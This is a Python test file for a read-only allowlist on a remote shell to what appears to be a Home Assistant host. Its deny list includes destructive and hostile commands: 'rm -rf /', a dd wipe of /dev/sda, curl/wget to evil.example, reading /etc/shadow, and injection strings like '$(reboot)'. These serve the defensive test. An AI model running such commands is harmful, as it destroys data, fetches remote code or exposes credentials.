#!/usr/bin/env python3
"""Host test for the read-only channel policy (ro_policy.check).

No network, no board: pure function tests of the allowlist. Run:
    python3 remote-shell/test_ro_policy.py
"""
import os
import sys

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import ro_policy  # noqa: E402

fails = []


def allow(cmd):
    ok, why = ro_policy.check(cmd)
    if not ok:
        print(f"  FAIL erlaubt erwartet: {cmd!r} -> {why}")
        fails.append(cmd)


def deny(cmd):
    ok, why = ro_policy.check(cmd)
    if ok:
        print(f"  FAIL verboten erwartet: {cmd!r}")
        fails.append(cmd)


print("ro_policy: erlaubte Befehle")
for c in (
    "uptime",
    "uname -a",
    "cat /proc/cpuinfo",
    "df -h",
    "lsblk",
    "free -m",
    "journalctl -n 50",
    "journalctl -u hassio-supervisor.service -n 100",
    "dmesg | tail -20",
    "cat /proc/cpuinfo | grep MHz",
    "systemctl status home-assistant",
    "systemctl list-timers",
    "btrfs filesystem usage /mnt/ssd",
    "btrfs subvolume list /mnt/ssd",
    "docker ps",
    "docker logs homeassistant",
    "ip -br addr",
    "ss -ltnp",
    "sensors",
    "vcgencmd measure_temp",
    "ps aux | grep -i ha",
    "grep -i error /var/log/syslog",
    "stat /mnt/ssd",
    "smartctl -a /dev/sda",
    "cat /sys/class/thermal/thermal_zone0/temp",
):
    allow(c)

print("ro_policy: verbotene Befehle")
for c in (
    "rm -rf /",
    "cat /etc/passwd; reboot",
    "echo hi > /tmp/x",
    "uptime && reboot",
    "systemctl restart home-assistant",
    "systemctl stop hassio-supervisor",
    "journalctl --vacuum-time=1s",
    "btrfs subvolume delete /mnt/ssd/@data",
    "dd if=/dev/zero of=/dev/sda",
    "curl http://evil.example/x",
    "wget http://evil.example/x",
    "python3 -c 'import os'",
    "bash -c 'rm -rf /'",
    "sudo reboot",
    "apt-get install foo",
    "kill -9 1",
    "mount /dev/sda1 /mnt",
    "chmod 777 /etc/shadow",
    "cat /etc/shadow",
    "`reboot`",
    "$(reboot)",
    "uptime\nreboot",
    "cat /proc/cpuinfo & reboot",
    "",
    "   ",
    "x" * 600,
):
    deny(c)

print("ro_policy: Pipeline mit einem verbotenen Segment")
deny("cat /proc/cpuinfo | sh")
deny("df -h | tee /tmp/out")
deny("ls | grep x | wc -l | reboot")

print("ro_policy: harmlose Befehle, die frueher falsch blockiert wurden")
allow("stat -c %s /etc/hostname")
allow("df -h")
allow("cat /proc/loadavg")
allow("getconf LONG_BIT")

print()
if fails:
    print(f"FAILED: {len(fails)} Fall/Faelle: {fails}")
    sys.exit(1)
print("alle ro_policy-Checks bestanden")
